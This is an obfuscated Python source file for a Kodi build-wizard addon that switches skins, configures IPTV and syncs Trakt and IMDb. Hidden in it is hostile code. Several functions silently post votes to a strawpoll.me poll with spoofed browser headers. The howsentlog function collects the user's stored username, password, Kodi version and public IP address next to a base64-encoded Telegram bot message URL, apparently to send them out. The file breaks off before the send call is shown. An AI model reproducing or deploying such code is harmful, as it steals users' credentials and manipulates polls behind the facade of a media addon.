# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:252
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	O000O0OOOOOO00OO0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OOO0O0O0OOOO0OOO0 =[];OO0OOOOOOOO00OO00 =[]#line:266
	for OO0O000O0OOOOO000 in sorted (O000O0OOOOOO00OO0 ,key =lambda O0O0OOO0000OO0000 :O0O0OOO0000OO0000 ):#line:267
		O0O0O000OO00OO0O0 =os .path .split (OO0O000O0OOOOO000 [:-1 ])[1 ]#line:268
		OOOOO0O0O0OOOOO00 =os .path .join (OO0O000O0OOOOO000 ,'addon.xml')#line:269
		if os .path .exists (OOOOO0O0O0OOOOO00 ):#line:270
			O0OO000OO000OOOO0 =open (OOOOO0O0O0OOOOO00 )#line:271
			O0000OOOOOO00O0OO =O0OO000OO000OOOO0 .read ()#line:272
			OO0OO000OOOO000OO =parseDOM2 (O0000OOOOOO00O0OO ,'addon',ret ='id')#line:273
			OO0OOO00OOOO0O000 =O0O0O000OO00OO0O0 if len (OO0OO000OOOO000OO )==0 else OO0OO000OOOO000OO [0 ]#line:274
			try :#line:275
				OO0OO0O0OOOOO0000 =xbmcaddon .Addon (id =OO0OOO00OOOO0O000 )#line:276
				OOO0O0O0OOOO0OOO0 .append (OO0OO0O0OOOOO0000 .getAddonInfo ('name'))#line:277
				OO0OOOOOOOO00OO00 .append (OO0OOO00OOOO0O000 )#line:278
			except :#line:279
				pass #line:280
	OO0O000O0OOOO00O0 =[];O000O00OOOO000O0O =0 #line:281
	OO00O0OOOO0OOOOOO =["Current Skin -- %s"%currSkin ()]+OOO0O0O0OOOO0OOO0 #line:282
	O000O00OOOO000O0O =DIALOG .select ("Select the Skin you want to swap with.",OO00O0OOOO0OOOOOO )#line:283
	if O000O00OOOO000O0O ==-1 :return #line:284
	else :#line:285
		O0000O0000OO0OOOO =(O000O00OOOO000O0O -1 )#line:286
		OO0O000O0OOOO00O0 .append (O0000O0000OO0OOOO )#line:287
		OO00O0OOOO0OOOOOO [O000O00OOOO000O0O ]="%s"%(OOO0O0O0OOOO0OOO0 [O0000O0000OO0OOOO ])#line:288
	if OO0O000O0OOOO00O0 ==None :return #line:289
	for O0O0OOOOOO0OO0O00 in OO0O000O0OOOO00O0 :#line:290
		swapSkins (OO0OOOOOOOO00OO00 [O0O0OOOOOO0OO0O00 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (OO0OOOO000000000O ,title ="Error"):#line:295
	OO0O0OO0O0000O00O ='lookandfeel.skin'#line:296
	O0O000OO0OO000OO0 =OO0OOOO000000000O #line:297
	O00O0O0OOO0000000 =getOld (OO0O0OO0O0000O00O )#line:298
	OO0O00O00OO0O0OO0 =OO0O0OO0O0000O00O #line:299
	setNew (OO0O00O00OO0O0OO0 ,O0O000OO0OO000OO0 )#line:300
	OOOOOOO0O000OOOOO =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOOOO0O000OOOOO <100 :#line:302
		OOOOOOO0O000OOOOO +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (OO0OO000O00OO0O00 ):#line:309
	try :#line:310
		OO0OO000O00OO0O00 ='"%s"'%OO0OO000O00OO0O00 #line:311
		O0OOOOO0OO000O0O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0OO000O00OO0O00 )#line:312
		O00O000OO00O00000 =xbmc .executeJSONRPC (O0OOOOO0OO000O0O0 )#line:314
		O00O000OO00O00000 =simplejson .loads (O00O000OO00O00000 )#line:315
		if O00O000OO00O00000 .has_key ('result'):#line:316
			if O00O000OO00O00000 ['result'].has_key ('value'):#line:317
				return O00O000OO00O00000 ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OO000O0O0OOO00O00 ,O0OOO0OOOOO0OO000 ):#line:324
	try :#line:325
		OO000O0O0OOO00O00 ='"%s"'%OO000O0O0OOO00O00 #line:326
		O0OOO0OOOOO0OO000 ='"%s"'%O0OOO0OOOOO0OO000 #line:327
		OO000O0000OO0000O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO000O0O0OOO00O00 ,O0OOO0OOOOO0OO000 )#line:328
		OO0OO0OO000OO0O0O =xbmc .executeJSONRPC (OO000O0000OO0000O )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			O00OOOOO0OOO0OO00 =xbmcgui .DialogProgress ()#line:339
			O00OOOOO0OOO0OO00 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			O00OOOOO0OOO0OO00 .update (0 )#line:343
			for OOO00O00OOO000O00 in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				O00OOOOO0OOO0OO00 .update (int ((5 -OOO00O00OOO000O00 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OOO00O00OOO000O00 ),'')#line:346
				if O00OOOOO0OOO0OO00 .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			O00OOOOO0OOO0OO00 =xbmcgui .DialogProgress ()#line:352
			O00OOOOO0OOO0OO00 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			O00OOOOO0OOO0OO00 .update (0 )#line:356
			for OOO00O00OOO000O00 in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				O00OOOOO0OOO0OO00 .update (int ((5 -OOO00O00OOO000O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOO00O00OOO000O00 ),'')#line:359
				if O00OOOOO0OOO0OO00 .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    OOOO0O00OO00000O0 ='18773068'#line:372
    OOO0O0O00000OO00O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO0O00OO00000O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    O000000OOOOOOOOO0 ='145273320'#line:386
    O0O00O0OOOOO0OO00 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        O0000OOO00OOO00OO =O000000OOOOOOOOO0 #line:389
    else :#line:390
        O0000OOO00OOO00OO =O0O00O0OOOOO0OO00 #line:391
    O000OO0OO0OOOOO00 ={'options':O0000OOO00OOO00OO }#line:395
    O000O0000OOO00000 =requests .post ('https://www.strawpoll.me/'+OOOO0O00OO00000O0 ,headers =OOO0O0O00000OO00O ,data =O000OO0OO0OOOOO00 )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        O0OOO00O00O0OOO0O ='18773068'#line:401
        OOOOOO0OOO0000OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOO00O00O0OOO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        OOO0OO00O0O0O0OOO ='145273320'#line:415
        O0OOOOO00000OOO0O ={'options':OOO0OO00O0O0O0OOO }#line:421
        O0OOO0000OOOOO0O0 =requests .post ('https://www.strawpoll.me/'+O0OOO00O00O0OOO0O ,headers =OOOOOO0OOO0000OO0 ,data =O0OOOOO00000OOO0O )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        OO0000OOOOOO0OO0O ='18773068'#line:428
        O0OO0OOO0OO0O00OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0000OOOOOO0OO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        O0O0OOO00OO00000O ='145273321'#line:442
        O0000OO0OO0OO0OO0 ={'options':O0O0OOO00OO00000O }#line:448
        OO0OOO0O000OO000O =requests .post ('https://www.strawpoll.me/'+OO0000OOOOOO0OO0O ,headers =O0OO0OOO0OO0O00OO ,data =O0000OO0OO0OO0OO0 )#line:450
   except :pass #line:451
def testcommand ():#line:455
    setautorealdebrid ()#line:456
def skin_homeselect ():#line:457
	try :#line:459
		O0OOOOOO0OO00OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:460
		OO0OO00OOO0OO0O0O =open (O0OOOOOO0OO00OOO0 ,'r')#line:462
		O00OOOOOO0OO0O000 =OO0OO00OOO0OO0O0O .read ()#line:463
		OO0OO00OOO0OO0O0O .close ()#line:464
		OO0OO000OO0OO0O00 ='<setting id="HomeS" type="string(.+?)/setting>'#line:465
		OOO000OO0O0OO0O0O =re .compile (OO0OO000OO0OO0O00 ).findall (O00OOOOOO0OO0O000 )[0 ]#line:466
		OO0OO00OOO0OO0O0O =open (O0OOOOOO0OO00OOO0 ,'w')#line:467
		OO0OO00OOO0OO0O0O .write (O00OOOOOO0OO0O000 .replace ('<setting id="HomeS" type="string%s/setting>'%OOO000OO0O0OO0O0O ,'<setting id="HomeS" type="string"></setting>'))#line:468
		OO0OO00OOO0OO0O0O .close ()#line:469
	except :#line:470
		pass #line:471
def autotrakt ():#line:474
    OO00O0O00O000OO00 =(ADDON .getSetting ("auto_trk"))#line:475
    if OO00O0O00O000OO00 =='true':#line:476
       from resources .libs import trk_aut #line:477
def traktsync ():#line:479
     O0OOOO00O0OOO0O00 =(ADDON .getSetting ("auto_trk"))#line:480
     if O0OOOO00O0OOO0O00 =='true':#line:481
       from resources .libs import trk_aut #line:484
     else :#line:485
        ADDON .openSettings ()#line:486
def imdb_synck ():#line:488
   try :#line:489
     O0O00000OO0000O00 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:490
     OO0OOOO0OO0OOO0OO =xbmcaddon .Addon ('plugin.video.gaia')#line:491
     OO00000OO0O00O0O0 =(ADDON .getSetting ("imdb_sync"))#line:492
     OO000OO00OO0OOOOO ="imdb.user"#line:493
     O00O0O0OO000000O0 ="accounts.informants.imdb.user"#line:494
     O0O00000OO0000O00 .setSetting (OO000OO00OO0OOOOO ,str (OO00000OO0O00O0O0 ))#line:495
     OO0OOOO0OO0OOO0OO .setSetting ('accounts.informants.imdb.enabled','true')#line:496
     OO0OOOO0OO0OOO0OO .setSetting (O00O0O0OO000000O0 ,str (OO00000OO0O00O0O0 ))#line:497
   except :pass #line:498
def dis_or_enable_addon (OO0O0OO00OO00000O ,OO0O000000O0O0O0O ,enable ="true"):#line:500
    import json #line:501
    OOO0O0OOOO00OOO0O ='"%s"'%OO0O0OO00OO00000O #line:502
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OO00OO00000O )and enable =="true":#line:503
        logging .warning ('already Enabled')#line:504
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O0OO00OO00000O )#line:505
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OO00OO00000O )and enable =="false":#line:506
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O0OO00OO00000O )#line:507
    else :#line:508
        OO0OO00O0O00000O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0O0OOOO00OOO0O ,enable )#line:509
        O0O00OO00OO0OO00O =xbmc .executeJSONRPC (OO0OO00O0O00000O0 )#line:510
        OO0OOOOOO0OO00O0O =json .loads (O0O00OO00OO0OO00O )#line:511
        if enable =="true":#line:512
            xbmc .log ("### Enabled %s, response = %s"%(OO0O0OO00OO00000O ,OO0OOOOOO0OO00O0O ))#line:513
        else :#line:514
            xbmc .log ("### Disabled %s, response = %s"%(OO0O0OO00OO00000O ,OO0OOOOOO0OO00O0O ))#line:515
    if OO0O000000O0O0O0O =='auto':#line:516
     return True #line:517
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:518
def iptvset ():#line:521
  try :#line:522
    OOOO00O000OOOO00O =(ADDON .getSetting ("iptv_on"))#line:523
    if OOOO00O000OOOO00O =='true':#line:525
       if KODIV >=17 and KODIV <18 :#line:527
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:528
         OOOO0O000O00OOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:529
         O0O0O0O00OO000OO0 =(ADDON .getSetting ("iptvUrl"))#line:531
         OOOO0O000O00OOO0O .setSetting ('m3uUrl',O0O0O0O00OO000OO0 )#line:532
         O00OOOO0OO0O0OO0O =(ADDON .getSetting ("epg_Url"))#line:533
         OOOO0O000O00OOO0O .setSetting ('epgUrl',O00OOOO0OO0O0OO0O )#line:534
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:537
         iptvsimpldownpc ()#line:538
         wiz .kodi17Fix ()#line:539
         xbmc .sleep (1000 )#line:540
         OOOO0O000O00OOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:541
         O0O0O0O00OO000OO0 =(ADDON .getSetting ("iptvUrl"))#line:542
         OOOO0O000O00OOO0O .setSetting ('m3uUrl',O0O0O0O00OO000OO0 )#line:543
         O00OOOO0OO0O0OO0O =(ADDON .getSetting ("epg_Url"))#line:544
         OOOO0O000O00OOO0O .setSetting ('epgUrl',O00OOOO0OO0O0OO0O )#line:545
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:547
         iptvsimpldown ()#line:548
         wiz .kodi17Fix ()#line:549
         xbmc .sleep (1000 )#line:550
         OOOO0O000O00OOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:551
         O0O0O0O00OO000OO0 =(ADDON .getSetting ("iptvUrl"))#line:552
         OOOO0O000O00OOO0O .setSetting ('m3uUrl',O0O0O0O00OO000OO0 )#line:553
         O00OOOO0OO0O0OO0O =(ADDON .getSetting ("epg_Url"))#line:554
         OOOO0O000O00OOO0O .setSetting ('epgUrl',O00OOOO0OO0O0OO0O )#line:555
  except :pass #line:556
def howsentlog ():#line:563
       try :#line:564
          import json #line:565
          OO0OOOOOOO00O0O0O =(ADDON .getSetting ("user"))#line:566
          OO0OO000O0OOO00O0 =(ADDON .getSetting ("pass"))#line:567
          OO000O0O0OO0O0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:568
          OO0O00000OO000OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:570
          O0OO0O000O0O0OO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:571
          OO00OO000O0O0O000 =str (json .loads (O0OO0O000O0O0OO0O )['ip'])#line:572
          OO00O000OO000O0O0 =OO0OOOOOOO00O0O0O #line:573
